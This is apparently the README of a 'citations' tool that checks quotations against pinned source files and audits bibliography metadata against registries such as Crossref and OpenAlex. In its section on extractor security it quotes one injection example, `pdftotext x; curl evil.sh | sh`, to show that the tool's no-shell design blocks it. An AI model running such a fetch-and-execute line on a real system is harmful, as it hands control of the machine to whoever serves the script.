`Footnote 1.` or `Endnote 1.` in that order; (3) each header and footer once, in the order the
sections name them. Footnotes and endnotes are numbered 1, 2, 3 in reference order whatever
Word shows; Word numbers endnotes i, ii, iii by default. Within a paragraph it reads hyperlink
text, a symbol as the character it draws, a ruby's base text, the result of a field and not its
instruction (so a reference manager's citation reads as printed), and an equation's characters
in order. The result of a `PAGE`, `NUMPAGES` or `SECTIONPAGES` field, of a formula over one
(`= PAGE - 1`), and of a `PAGEREF` inside a table of contents is not read: it is a page number
from Word's last layout, not a number the document states. A `PAGEREF` in prose is read, since
`see page 14` is a page the author refers to. Tracked changes are read as accepted: an
insertion is read and a deletion is not, in an equation too. Comments are not read, so a
quotation never resolves against a reviewer's note, and neither are automatic list numbers,
which Word does not store. A part is decoded as an XML parser detects its encoding (a
byte-order mark, UTF-16 with no mark, the declaration's encoding, else UTF-8), and the parser
is given that decoded text, so the check for a document type reads what is parsed. A part
declaring a document type, one that does not decode or holds a NUL, and a file whose XML
inflates past 128 MiB, are refused unread.

Version 1, which reads the body's paragraphs and then its tables through `python-docx`, stays
for sources pinned under it: a source block recording `extractor_version: 1` is read by
version 1, and so is a source that records a `derived_sha256` and no version.
`citations pin` has recorded the version beside the digest since both fields were added, so a
digest with no version was written before that, by version 1. That includes a `.docx` source
naming no extractor. The output says so, as `read with docx-text@1, inferred: no version
recorded; set extractor_version to choose`. Any other source that records no version, such as
one written by hand, is read by version 2, and `citations pin` records the extractor and the
version that read it with its next quotation.

`sheet-rows` takes two more fields: `sheet: ST1` reads that sheet alone, where the default is
every sheet in workbook order, and `empty_cells: keep` keeps a row's empty cells, where the
default drops them. A source names `extractor` or `extract_cmd`, never both.

Each extractor has a version, and the version is of its output: it changes when the same bytes
would produce different text. A result names both, as `jats-text@1`. A claims file naming a
version this build does not ship is `unchecked` and says which two versions are involved,
because reading with the other one would report a verdict against text the file never pinned.
A reader that is not installed is `unchecked` and names the install. Neither is ever `found`.

`derived_sha256` is the digest of the extracted text. The pin establishes that the bytes did
not change; this establishes that the reading of them did not. `citations pin` writes it, with
`extractor_version`, when the first quotation is pinned, and refuses a later quotation where the
extractor no longer produces that text. `verify` reports such a source beside the broken pins
and fails, and `fetch` reports it as `text differs`.

Read as plain text, an article's XML keeps `<italic>`, `<sup>`, `<xref>` and its character
entities, and a quotation crossing one does not resolve. On 72 Europe PMC and NCBI articles
whose quotations had been pinned against tag-stripped text, 194 of 314 quotations resolved in
the XML as served and 308 resolve through `jats-text`. The other 6 are table rows quoted with
spaces between cells, which `jats-text` renders with `|` between them.

## Audit output

`verify` asks whether a quotation is in the source. `audit` asks a different question: does the
author list, year, venue, volume and page range stored beside an identifier match the record that
identifier resolves to?

```bash
citations audit --bib paper/references.bib
```

```text
75 entries

  checked          62
  agree            36
  disagree         26
  no id            13   nothing can check these until they have a DOI or PMID

26 disagree with the record their own identifier resolves to.
a wrong author list on a right DOI is invisible to every other check.
```

That run is real. Four of those entries carried an author list belonging to nobody on the
cited paper, one PMID resolved to an unrelated article in another field, and four author lists
stopped early with no `and others` marker. Every one of them resolved. A DOI checker, a link
checker and `citations verify` all pass them, because the DOI does point at the right paper —
it is the names beside it that belong to someone else.

Disagreements a registry causes rather than the bibliography are not reported: an online-first
year against a print year, a deposited initial against a printed given name, PubMed's
abbreviated end page, a BibTeX accent against the Unicode it encodes, and markup a publisher
deposited inside a title. What survives is a disagreement about the work.

An entry with no DOI and no PMID is searched for by title in Semantic Scholar, Crossref,
OpenAlex and arXiv. A candidate is accepted under the rule `citations resolve` uses: the title
is close, the first author's surname is among the candidate's authors, and the year agrees
within one. The entry is then compared with the registry record of the identifier found, and
the report lists that identifier so it can be added to the entry.

| Row | Meaning | Fails `--strict` |
|---|---|---|
| `by search` | The search found a DOI or an arXiv id and the entry was compared with its record. An arXiv id is read as the DataCite DOI `10.48550/arXiv.<id>`. These entries are counted in `checked`. | on a disagreement, exit 1 |
| `found` | The search matched an OpenAlex record that has no DOI, so there is no registry record to compare with. | no |
| `not found` | A title search that Crossref or OpenAlex answered matched no record, or every registry asked answered that the entry's own DOI or PMID names no record (a 404 or 410, or a 400 or 422 rejecting the identifier as malformed). A book, a report and a thesis land here, and so does a reference to a work that does not exist. | exit 1, unless the key is on the checked list |
| `marked` | Of those not found, the keys on the checked list. Each is still listed under `not found`, as `(marked as checked)`. | no |
| `could not check` | A registry refused or did not answer (a 401 or 403, a rate limit, a timeout, a 5xx, a body that is not a record), or a title search in which neither Crossref nor OpenAlex answered. No measurement was made. | exit 2, when nothing else fails |

Without `--strict` every row is reported and the command exits 0. With it, the exit code is 1
for a disagreement or an unlisted not found, 2 when the only failures are lookups that could
not be made, and 0 otherwise. A failed lookup exits 2 rather than 1 so that a CI job can retry
it instead of sending the author after a citation that may be correct, and a disagreement
outranks it, because no retry changes a disagreement. An audit that checked nothing also exits
2 under `--strict`, and says `nothing was checked`: an empty bibliography, or one whose every
entry is `no id` or `could not check`, as under `--no-search`. An entry searched for and not
found counts as checked, so a bibliography of listed works no registry holds can pass.

A service answers a title search in one of three ways besides a match:

| Answer | Status codes | Counted as |
|---|---|---|
| it has nothing | 200 with no match, 404, 410 | answered; listed under `searched` |
| it rejected the query | 400, 422 | neither answered nor refused; listed under `rejected`, and the report line says `Crossref rejected the query` |
| it did not answer | 401, 403, 429, 5xx, a timeout, a body that does not parse | refused; listed under `refused`, and the report line says `Semantic Scholar could not be asked` |

A title search is `not found` when nothing matched and Crossref or OpenAlex answered, whatever
the other services did, because most indexed works are in one of the two:
`not found by title search (crossref, openalex, arxiv); Semantic Scholar could not be asked`.
When neither Crossref nor OpenAlex answered, because each refused or rejected the query, the
entry is `could not check`, even where Semantic Scholar or arXiv answered with nothing. A
rejected query is asked again on every run with the same result, so it never counts toward
giving up on the search services after several entries in a row are refused.

### Entries checked by hand

A thesis, a book chapter, a report or a dataset is often in no registry, and `--strict` cannot
tell it from a reference to a work that does not exist. Once an author has checked such an
entry by hand, its key goes in a plain file beside the bibliography, named for it:
`references.checked.txt` for `references.bib`, or `checked.txt` at the root of a library.
`--checked PATH` names another file.

```text
# entries checked by hand: in no registry, confirmed against the printed copy
smith2019thesis       # PhD thesis, University of Edinburgh
who2021report
```

One key per line, in UTF-8 (a byte-order mark is ignored); `#` starts a note. A file in another encoding is refused, naming the file. A line with two words before a `#` is refused, so a key
is never half read. A listed key is still reported as `not found`, marked as checked, and does
not fail `--strict`. The list excuses nothing else: a listed key that is found and disagrees on
a field fails as any other does, and a listed key that is found at all is printed as a warning,
since it may no longer need to be on the list. A listed key whose own DOI or PMID every
registry answers 404 for is excused, because a DOI registered with neither Crossref nor
DataCite (mEDRA, JaLC) is real, but a mistyped DOI looks the same, so each such key is printed
as `listed as checked, but its DOI does not resolve; check it isn't mistyped` and listed under
`checked_list.identifier_does_not_resolve`. A listed key the bibliography does not have is
warned about as stale. The report prints the file's path and SHA-256, and `--json` carries both
with the keys read and the stale ones under `checked_list`, so a run's reliance on the list is
on record.

An identifier found by title can belong to another version of the work, such as the preprint of
a journal article, so a year or venue disagreement on a `by search` entry is read before it is
corrected. `--no-search` asks no search service and counts these entries under `no id`, as in
the report above.

### Venue

A venue is compared by identifier. The record's venue is the identifiers its registries give it:
a journal article's ISSNs from Crossref, PubMed's NLM id and ISSNs, a DataCite container's
ISSN, the ISSNs Semantic Scholar or OpenAlex give the venue of a work found by title, and,
where the record carries none, the primary source of the OpenAlex work. Wikidata widens those
to the items that hold them, so the record's venue also carries its Wikidata item, OpenAlex
source and DBLP venue key.

The entry's `journal` or `booktitle`, or its `series` where it names neither, is resolved to the
same kinds of identifier through registries that index venue names and their abbreviations:
Wikidata's labels, aliases, short names and ISO 4 abbreviations, and OpenAlex sources' display
names, abbreviated titles and alternate titles. An `issn` field is resolved beside the name: where
the name agrees with the record's venue and a registry knows the ISSN as another venue, the ISSN is
reported as its own disagreement, `issn: ours '...' vs registry '...'`. Where the name names
another venue than the record's, an ISSN registries know as that same venue supports the
mismatch, an ISSN no registry knows leaves the name to decide alone, and an ISSN registries know
as a third venue leaves it not comparable, the entry contradicting itself. A registry
venue is a candidate when one of its own names equals the cited one once case, accents,
punctuation, LaTeX, years, ordinals and volume numbers are folded away; candidates that share
an identifier, or that Wikidata links as a conference and its proceedings or as editions of one
series, are one venue.

| Outcome | When |
|---|---|
| match | the entry's venue and the record's share an identifier, directly or through one Wikidata link |
| mismatch | the entry's venue resolved to exactly one registry venue, the record carries its venue's identifiers itself, both sides hold an ISSN, NLM id or DBLP key, and none is shared |
| not comparable | anything else |

A mismatch is reported like a wrong year, as `venue: ours 'Nature' vs registry 'Nature
Communications'`, and fails `--strict`. A Wikidata item or an OpenAlex source can be one edition
of a conference or one of several records of one journal, so those identifiers confirm a venue
and never contradict one. A book series' ISSN, such as Lecture Notes in Computer Science's, can
confirm the series an entry names and never contradicts the volume it names.

A venue that is not comparable is listed with both names, so a person can compare them:
`venue: ours 'Comput. Netw.' / registry 'Computer Networks' (not comparable: <reason>)`. The
reasons are a name no registry knows, a name several registry venues share, a lookup that was
refused, a record that is a preprint or names no venue identifier, an entry citing a preprint
server, a workshop against a main track, a record identified only by its name, two sides with
no serial identifier of a common kind, and a garbled name.

A lookup answered with 404 or 410 is an answer and is cached, and so is a 400 or 422, which
rejects the query and adds no names. Any other failure (a 500, a 502,
a 403, a rate limit, no response, or a MediaWiki error reported inside an HTTP 200) is a refusal:
it is never cached, so the next run asks again, and a venue resting on it is not comparable.

A venue that is not comparable never fails `--strict`, and never makes an entry `could not
check`: the entry's status rests on its other fields. A venue lookup that was refused is
reported as the reason the venue is not comparable, on the venue's line and under `venue.why`,
and is not added to the entry's `refused`, which names the registries and search services the
entry's own status rests on.

Registry lookups are cached like every other request, sent with no contact address, and
paced; a Wikidata request names the project in its `User-Agent`, as the Wikimedia policy asks.

API keys are optional. The audit works without them, and compares more venues with them,
because a lookup a service refuses leaves its venue not comparable:

| Variable | Service | Used |
|---|---|---|
| `SEMANTIC_SCHOLAR_API_KEY` | Semantic Scholar | on every request, as the `x-api-key` header; Semantic Scholar refuses many anonymous requests, and its answer is often the only one naming the published venue of an arXiv preprint |
| `OPENALEX_API_KEY` | OpenAlex | as a fallback only: a request goes out unkeyed first, and is retried with the key, as an `Authorization: Bearer` header, only when OpenAlex refuses it, so a key with a small quota is spent only where the shared unkeyed budget has run out |

A query OpenAlex rejects, a 400 or 422, is an answer about the query rather than a refusal, and
is never retried with the key.

Neither key is ever part of a URL, so neither reaches a cache file, a report, a log line or an
error message. DBLP's API is not asked, because it answers automated clients with a proof-of-work
page; DBLP venue keys are compared where Wikidata holds them.

Fetched payloads and search answers are cached beside the file audited, so a re-run is offline
and the report is reproducible from what was fetched rather than from the network. A refusal is
not cached, so a service that refused is asked again on the next run.

## Adding an entry to a bibliography

Appending an entry by hand is how a duplicate key gets into a `.bib`, and BibTeX's answer to one
is non-fatal. It reports `Repeated entry`, keeps the copy the file defines first, skips the
second and writes a `.bbl` without it — so a corrected entry appended below an old one never
reaches the reference list, and the build fails somewhere else entirely, in `Citation undefined`
warnings that name nothing.

```bash
citations add refs.bib --key smith2026thing --entry-file entry.bib
citations add refs.bib --doi 10.1145/3287560.3287596
citations add refs.bib --arxiv 1706.03762
```

A key the file already defines exits non-zero, prints both entries side by side and writes
nothing. Case is folded, because BibTeX folds it: `Smith2026Thing` in a file that has
`smith2026thing` is a repeat under BibTeX and a second work under biber, and neither is what the
file says. Where the entry is fetched, it is shown before it is written and carries every author
the registry lists — `and others` is never written into a `.bib`, since a shortened list looks
exactly like a complete one.

```console
$ citations add refs.bib --arxiv 1706.03762
  fetched from  arxiv
  authors       8, as the registry lists them
  key           vaswani2017attention  (derived; --key names another)
...
  appended to refs.bib: 2 entries, now 3, vaswani2017attention in exactly one.
```

The write is read back before it is reported: the file has to parse as every entry it parsed as
before plus this one, with the key on exactly one line, or the original bytes go back.

`citations lint --bib refs.bib` asks the same question of a file already written, and reads the
author fields while it is there. It needs no papis, no library and no network, so it runs in
continuous integration.

```text
  bib  refs.bib
    sprague2024cot                        repeated  lines 374, 989
    bhaskar2024finding                    bare      line 41
      no given name for 4 of the authors: 'Bhaskar', 'Wettig', 'Friedman', 'Chen'

  230 entries, 1 repeated key(s), 1 author list(s) with a bare family name
```

`bare` is an author written as a family name with nothing beside it. `author = {Bhaskar and
Wettig and Friedman and Chen}` prints as "Bhaskar, Wettig, Friedman, and Chen." in the reference
list, and five entries in one paper's bibliography were like that on the day it was submitted.
`citations lint --authors` passed all five: those four family names are the four
arXiv:2406.16778 lists, in order, and family names are all that comparison reads. Nothing
outside the file settles a missing given name, so it is checked offline beside the repeated
keys. A braced name is not a finding — `{NASA}`, `{Open Science Collaboration}` — because braces
are how BibTeX is told a name has no given part and is printed as written; the same braces keep
`{U.S. Food and Drug Administration}` one author rather than two.

## Author lists, against the identifier the entry already carries

`citations lint --authors refs.bib` reads each entry's author list back against the registry its
own DOI or arXiv id names. Two agents in one session attributed "Mediational E-values" to
VanderWeele and Chiba while quoting the paper's DOI; Crossref gives Smith, Louisa H. and
VanderWeele, Tyler J. A VanderWeele and Chiba paper does exist, on another subject in another
journal, so the entry was two real papers written as one — every field named something that
exists, which is why reading the reference list does not catch it.

```console
$ citations lint --authors refs.bib
  authors  refs.bib
  cache    .author-cache.yaml
    vanderweele2019mediational            wrong    doi:10.1097/EDE.0000000000001064  (crossref)
      author 1: ours 'VanderWeele, Tyler J.', registry 'Smith, Louisa H.'
    vaswani2017attention                  marker   arxiv:1706.03762  (arxiv)
      the list is shortened with `and others` / `et al.`; the registry lists 8

  4 entries, 3 checked, 1 with no identifier, 0 that did not fetch, 3 finding(s)
```

Four kinds of finding come out of the one comparison: `wrong` for a name belonging to another
paper, `dropped` for a list that stops early with no marker, `marker` for `and others` or
`et al.` written into a `.bib`, and `order` for the registry's names in another sequence.
Comparison is on family names, folded, with both spellings of an accent and with surname
particles stripped as well as kept, so Krzyżosiak against Krzyzosiak and "de Mezer" against the
"Mezer" OpenAlex files it under are not findings. Entries carrying no identifier are skipped and
counted rather than passed. Resolved lists are cached in `.author-cache.yaml` beside the
bibliography, so a second run needs no network and a pre-commit hook can call it.

A list whose family names are the registry's and whose given names are absent is none of the
four, and `--bib` reports it from the file alone.

## Full text through Paperclip

`citations resolve --via paperclip` fetches a source's full text from
[Paperclip](https://paperclip.gxl.ai), writes it to `sources/paperclip/`, and pins those bytes by
sha256 in a claims file.

```bash
pip install 'citations[paperclip]'
export PAPERCLIP_API_KEY=...
citations resolve --via paperclip 10.1101/2025.10.22.681631 10.1038/s41586-021-03819-2
```

```text
  pinned      10.1101/2025.10.22.681631               d9f585e2faad
  unavailable 10.1038/s41586-021-03819-2              Paperclip truncated the document at 2179 of 2485 lines

  pinned 1 of 2
  1 without a pinned copy; quotations against those read `unchecked`.
```

**Paperclip is never in the verification path.** It is asked once, for bytes. Afterwards
`citations verify` reads the local file and nothing else, so a check runs with no network, no
account, and no dependence on the service still serving the same corpus. A remote answer that a
passage is in a paper is an answer nobody can re-derive.

| Outcome | Meaning | What `verify` then reports |
|---|---|---|
| `pinned` | the whole document arrived and carries a digest | `found` or `not found` |
| `unresolved` | Paperclip indexes no full text for the identifier | `unchecked` |
| `unavailable` | the extra is absent, no key is set, or the answer was not the whole document | `unchecked` |

Full text is open access only, so a bibliography of Elsevier and Springer articles resolves
mostly to `unchecked`. That is the true account of what can be checked, and the extra being
uninstalled produces the same `unchecked` rather than an error.

A document that arrives incomplete is refused rather than pinned. Paperclip cuts its own output
at 250,000 characters — mid-sentence, with `[output truncated at 250000 chars]` appended — so a
2,485-line article arrives as its first 2,179 lines. Pinning a prefix would put part of a paper
on disk under the name of the whole one, and every quotation past the cut would read `not found`,
a checker manufacturing misquotations out of a transfer limit. So the file's last line number is
read first with `tail -n 1`, and a body that does not run to it is `unavailable`.

That extent comes from the file and never from `ls`, whose printed `(N lines)` counts something
else for a PubMed Central document: 1,626 against a file whose last line is L829. For bioRxiv the
two agree, so taking the listing at its word looks right until it silently refuses every PMC
paper in a bibliography as truncated.

### Importing a paper repo

`citations import-paperclip <repo>` reads a Paperclip repo and writes one claim file per paper,
each source resolved and pinned.

```bash
citations import-paperclip my-review --claims paper/claims
```

A committed claim becomes a `statement`, because that is what it is: the sentence whoever
committed it wrote, not a passage from the paper. Putting it under `quotes` would have the tool
search the source for a sentence nobody says is in it. The quotes list comes out empty, for the
author to fill in against the pinned text.

A `--lines L45-L52` range becomes the claim's `hint`, recorded and never verified. It addresses
Paperclip's parse of a PDF, which is remote and can be re-run with every line renumbered, so it
says where to start reading and cannot say what a passage is. It is never written to `page`,
which is the locator `verify` checks.

```yaml
source:
  local: sources/paperclip/10-1101-2025-10-22-681631.txt
  sha256: d9f585e2faad2d878878fe5c5490babe9b9986e90642c7545fb4e72ef7a21653
  extract_cmd: none
  paperclip:
    identifier: 10.1101/2025.10.22.681631
    document: 22c1bebd-6dc0-1014-8e0e-900874d71cd6
    path: /papers/22c1bebd-6dc0-1014-8e0e-900874d71cd6/content.lines
    lines: 79
    service_version: 0.7.38
    fetched: '2026-08-25T19:34:02+00:00'

claims:
  c-9c1a2f6b04:
    statement: 'Features are polysemantic.'
    hint: 'L45-L52'
    quotes: []
```

## Identifying yourself to the metadata services

`citations resolve`, `citations add` and `citations audit` query Crossref, OpenAlex, arXiv and
Semantic Scholar. Set `CITATIONS_CONTACT` to an address you are willing to send them:

```bash
export CITATIONS_CONTACT=you@example.org
```

Nothing is sent without it. Crossref and OpenAlex then place the requests in their polite pool,
which is faster and less likely to rate-limit, so a long `citations lint --authors` run over a
large bibliography is slower with the variable unset. That is the tradeoff, not a regression: the
alternative was shipping one person's address in every user's requests.

Semantic Scholar is asked without a key by default, and its anonymous quota is low enough that
it often refuses. Set `SEMANTIC_SCHOLAR_API_KEY` to a key from Semantic Scholar to have its
answers counted. No other service needs a key, and a service that refuses is reported as not
having answered, never as having found nothing.

```bash
export SEMANTIC_SCHOLAR_API_KEY=...
```

## Where the library lives

```text
$CITATIONS_HOME             if set
./.citations/ walking up    this project's own, the way git finds .git
the shared library          if you made one with citations init --user
none of those               it tells you to run citations init
```

Project-local by default, so running the tool inside a paper works on that paper and there is
no hidden global state.

### Sources the library holds

`citations verify --claims claims/` reads each source at the path its claims file names. Where
that path holds no file, it looks for `pdfs/<the same filename>` in the library and reads that
copy only if its bytes hash to the sha256 the claims file pins:

```yaml
source:
  local: reference/schiffman2026.pdf   # absent in a fresh clone
  sha256: 3f9a…                        # $CITATIONS_HOME/pdfs/schiffman2026.pdf is read if it hashes to this
```

The report then says how many sources were read that way and from which directory:

```text
94 sources absent at the path the record names and read from the library, matched to the pinned sha256
  /home/you/citations-library/pdfs
```

The pin is what identifies the file; the name only says where to look. A claims file with no
`sha256` is never read from the library, and its quotations stay `unchecked` with a reason
saying a pin is needed. A library file under the right name with other bytes is not read
either, and the reason gives both digests. `verify` writes nothing to the library and downloads
nothing, a source present at the path its claims file names is read from there as before, and
a library with no `pdfs/` entry under that name leaves the report as it was: `unchecked`,
`file not found`.

## What a claim file looks like

One file per source, in the paper's `claims/` directory. `citations verify --claims claims`
reads all of them.

```yaml
source:
  citation: schiffman2026             # the bibkey
  local: reference/schiffman2026.pdf  # what gets read
  sha256: 3f9a…                       # which bytes were read
  extract_cmd: pdftotext -layout {} - # what turned the bytes into text

claims:
  orthogonal-cores:
    statement: 'Cores meeting equivalent causal criteria sit at principal angles of 75-90 degrees.'
    quotes:
      - exact: 'and principal angles ranged'
        section: 'body'
```

`statement` is yours; `exact` is theirs. The tool checks the second only, so a `statement` that
overreaches its quote is for review to catch — the command cannot.

## Declaring the extractor

A PDF goes through `pdftotext -layout`; `.txt`, `.md`, `.tei`, `.xml`, `.html`, `.htm` and
`.rst` are read straight off disk; a workbook or a `.docx` goes through a built-in extractor;
a web page pinned with `--url` declares its own reading when it is pinned.
Anything else — a `.tex` manuscript, a two-column PDF whose columns `-layout` splices
together — needs a renderer the claims file names:

```yaml
source:
  local: paper/manuscript.tex
  sha256: 8c41…
  extract_cmd: detex
```

The source path replaces `{}`, or is appended when the command has no `{}`, and the command
prints the text to stdout. That text is what the quotations resolve against, and `verify` names
the command that produced it:

```text
1 quotes

  found             1
  not found         0

read by
        1  detex
```

Which renderer is not a detail. `detex` leaves `\REVIEW{check this against Table 2}` welded
onto the word before it, so a quotation ending at that word comes back `found` with a
`truncated` warning; `pandoc -f latex -t plain` drops the annotation and the same quotation
comes back clean. A pin says the bytes did not change and says nothing about how they were
read, so the report names the extractor and records a digest of what it produced.

The package ships no LaTeX support, because a renderer has to settle three things a package
cannot settle for every manuscript. The renderer this project uses on its own manuscript drops
the argument of an annotation macro (`\REVIEW{...}` sitting between two words of a sentence),
keeps the argument of every other control word (`\textbf{145 are checkable}` is the number the
claim is about), and puts a separator wherever markup was removed, so a quotation cannot
silently span two table cells. Those three rules are right for that manuscript and wrong for
one that writes prose inside `\REVIEW`, which is why the field names a renderer rather than
the package guessing at one.

### What is allowed to run

`extract_cmd` runs a program on the machine doing the checking. The case that decides the rules
is not an author running their own claims file: it is `citations verify` in CI on a pull request
from a fork, where the contributor wrote the claims file and the command executes on the
maintainer's runner with the runner's environment in reach.

- **No shell.** The declared string is split into a program and arguments and executed
  directly. `pdftotext x; curl evil.sh | sh` is not filtered out — it cannot be expressed. The
  `;` and the `|` arrive at `pdftotext` as arguments and it fails.
- **An allowlist.** `pdftotext` and `detex` run unasked. Anything else needs
  `citations verify --allow-extractor NAME`, written by whoever runs the check rather than by
  whoever wrote the claims file. The program is matched as written, so `pdftotext` is allowed
  and `./pdftotext` is not.

A refused command is `unchecked` and says it was refused; a command that is not installed is
`unchecked` and says that instead. The remedy for one is consent and for the other an install,
and neither makes the passage absent.

A built-in `extractor` is outside the allowlist. It runs in the checking process and executes
no program, so a claims file naming one has named a reader this package ships and nothing on
the machine.

The allowlist bounds which program runs, not what an allowed program can be told to do, so a
program that loads and runs code named on its own command line stays out of the default set.
`pandoc --lua-filter` and `mutool run` are both arbitrary execution; reaching either is a
deliberate act with the consequence in view.

## Records are YAML

So `git diff` shows what changed. A binary store cannot show you that a year moved from 2021 to
2022 — a real discrepancy this found between two of one author's own papers.

## Claude Code

`plugin/` is a Claude Code plugin. Three surfaces, because each catches a different failure:
the hook catches what the model does not think to do, the skill catches what you did not know
to ask for, and the command is there for when you want the answer now.

| surface | fires |
|---|---|
| hook | when a quotation enters a manuscript that no claim file pins to a source |
| skill | when Claude judges the situation calls for quoting a paper, adding a citation, or checking whether a quote is real |
| command | when you type `/citations-check` |

**Why the hook.** A quotation is the one thing in a paper that can be checked exactly: it is in the source or it is not. Prose is where a remembered sentence drifts, and nearly right is wrong. Passages are compared with case, spacing and punctuation folded away, so a curly apostrophe or a wrapped line does not read as a passage nobody pinned.

It reports and never blocks, and stays silent in a project with no `claims/` directory.

```bash
/plugin marketplace add elliottower/reproducible-science
/plugin install citations@reproducible-science
```

The plugin ships instructions and hooks, not binaries, so install the tool as well:

```bash
uv tool install citations        # or: pip install citations
```

All four tools in one plugin, with every hook, skill and command:

```bash
/plugin install reproducible-science@reproducible-science
```

MIT licensed. `docs/` has the working practices this came out of.

## This tool and `repro`

`citations` installs and runs on its own, is not deprecated, and is not going to be.
`reproducible-science` depends on it, so `repro citations ...` runs this same command with the
same arguments and the same exit code. That is a spelling, not a feature.

What only exists in the umbrella is `repro check`, which runs every tool a project uses in one
pass, with one report and one exit code, and names the tools the project does not use rather
than counting them as passing. If a project checks quotations and nothing else, use this command directly.
